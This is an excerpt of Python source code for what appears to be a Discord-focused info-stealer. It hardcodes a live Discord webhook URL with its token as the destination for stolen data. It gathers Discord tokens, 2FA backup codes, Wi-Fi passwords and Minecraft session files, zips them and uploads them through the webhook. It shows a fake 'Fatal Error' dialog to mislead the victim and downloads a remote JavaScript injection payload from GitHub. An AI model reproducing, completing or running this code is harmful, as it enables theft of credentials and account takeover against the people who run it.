...
__WEBHOOK__ = "https://discord.com/api/webhooks/1029213565950902292/GLz3kcmMRIxUV9qW1ZVZ5Np7Dq6gJhEqVFvNfKVFMHIKOveYqEcEPbiES5fTxLexPayH"
__PING__ = True
...
def main(webhook: str):
    ...
    _file = None
    _file = File(f'{localappdata}\\4n4rchy-{os.getlogin()}.zip')
    ...
    webhook.send(content=content, file=_file, avatar_url="", username="asdasdas")
...
def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while injecting drivers.', 'Fatal Error', 0)
...
#        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
#        embed = Embed(title="Account Authorization Token", color=2565927)
...
#        webhook.send(embed=embed, avatar_url="", username="asdasdas")
...
class Discord:
    ...
    def upload(self, webhook):
        ...
        #embed2 = Embed(title="Desktop Screenshot", color=2565927)
...
class Wifi:
    def __init__(self):
        ...
        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"Wifi Networks & Passwords\n\n")
...
class Minecraft:
    ...
    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"Minecraft Session Info\n\n")
    ...
    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"Minecraft User Cache\n\n")
...
class BackupCodes:
    ...
    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"Discord Backup Codes\n\n")
...
def zipup():
    ...
    _zipfile = os.path.join(localappdata, f'4n4rchy-{os.getlogin()}.zip')
...
class Injection:
    def __init__(self, webhook: str):
        ...
        self.code = requests.get("https://raw.githubusercontent.com/griefxbl/Stringless/main/injection.js").text
